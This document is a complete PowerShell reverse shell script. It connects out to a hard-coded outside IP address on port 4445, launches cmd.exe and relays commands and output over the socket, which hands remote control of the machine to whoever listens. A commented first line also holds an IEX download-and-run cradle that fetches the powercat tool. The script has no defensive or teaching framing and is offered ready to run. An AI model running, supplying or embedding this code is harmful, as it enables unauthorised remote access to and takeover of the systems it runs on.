# IEX (New-Object System.Net.webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
function Start-ReverseShell {
    param(
        [string]$AttackerHost,   # Replace with the attacker's IP
        [int]$AttackerPort       # Replace with the attacker's port
    )

    # Setup TCP connection
    $Socket = New-Object System.Net.Sockets.TcpClient
    $Socket.Connect($AttackerHost, $AttackerPort)
    $Stream = $Socket.GetStream()
    $Writer = New-Object System.IO.StreamWriter($Stream)
    $Reader = New-Object System.IO.StreamReader($Stream)

    # Setup CMD process
    $ProcessVars = Setup-CMD @("cmd.exe")

    # Main loop to handle interaction
    while ($true) {
        # Handle cmd.exe output
        if ($ProcessVars["StdOutReadOperation"].IsCompleted) {
            $OutputData, $ProcessVars = ReadData-CMD $ProcessVars
            if ($OutputData) {
                $Writer.Write([System.Text.Encoding]::ASCII.GetString($OutputData))
                $Writer.Flush()
            }
        }
    
        # Handle attacker input
        if ($Stream.DataAvailable) {
            $InputData = $Reader.ReadLine()
            if ($InputData) {
                WriteData-CMD ([System.Text.Encoding]::ASCII.GetBytes($InputData + "`n")) $ProcessVars
            }
        }
    
        # Exit if the process is no longer running
        if ($ProcessVars["Process"].HasExited) {
            break
        }
    
        # Reduce CPU usage
        Start-Sleep -Milliseconds 10
    }

    # Close the process and connection
    Close-CMD $ProcessVars
    $Writer.Close()
    $Reader.Close()
    $Stream.Close()
    $Socket.Close()
}

# Setup the CMD process
function Setup-CMD {
    param($FuncSetupVars)
    $FuncVars = @{}
    $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessStartInfo.FileName = $FuncSetupVars[0]
    $ProcessStartInfo.UseShellExecute = $False
    $ProcessStartInfo.RedirectStandardInput = $True
    $ProcessStartInfo.RedirectStandardOutput = $True
    $ProcessStartInfo.RedirectStandardError = $True
    $FuncVars["Process"] = [System.Diagnostics.Process]::Start($ProcessStartInfo)
    $FuncVars["StdOutDestinationBuffer"] = New-Object System.Byte[] 65536
    $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
    $FuncVars["StdErrDestinationBuffer"] = New-Object System.Byte[] 65536
    $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    return $FuncVars
}

# Read data from CMD process
function ReadData-CMD {
    param($FuncVars)
    [byte[]]$Data = @()
    if ($FuncVars["StdOutReadOperation"].IsCompleted) {
        $StdOutBytesRead = $FuncVars["Process"].StandardOutput.BaseStream.EndRead($FuncVars["StdOutReadOperation"])
        if ($StdOutBytesRead -gt 0) {
            $Data += $FuncVars["StdOutDestinationBuffer"][0..([int]$StdOutBytesRead-1)]
            $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
        }
    }
    if ($FuncVars["StdErrReadOperation"].IsCompleted) {
        $StdErrBytesRead = $FuncVars["Process"].StandardError.BaseStream.EndRead($FuncVars["StdErrReadOperation"])
        if ($StdErrBytesRead -gt 0) {
            $Data += $FuncVars["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)]
            $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
        }
    }
    return $Data, $FuncVars
}

# Write data to CMD process
function WriteData-CMD {
    param($Data, $FuncVars)
    $FuncVars["Process"].StandardInput.WriteLine($FuncVars["Encoding"].GetString($Data).TrimEnd("`r").TrimEnd("`n"))
    return $FuncVars
}

# Close the CMD process
function Close-CMD {
    param($FuncVars)
    $FuncVars["Process"].Kill()
}

# Example usage
Start-ReverseShell -AttackerHost "3.89.198.37" -AttackerPort 4445
